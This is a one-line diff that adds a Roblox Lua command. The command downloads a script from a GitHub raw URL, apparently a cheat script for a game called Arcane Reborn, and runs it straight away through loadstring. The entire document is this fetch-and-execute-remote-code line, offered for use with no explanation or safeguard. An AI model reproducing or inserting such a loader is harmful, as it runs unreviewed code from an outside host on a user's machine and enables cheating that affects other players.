@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VendZzz/Arcane-Reborn-Script/main/Arcane%20Reborn%20Script",true))()
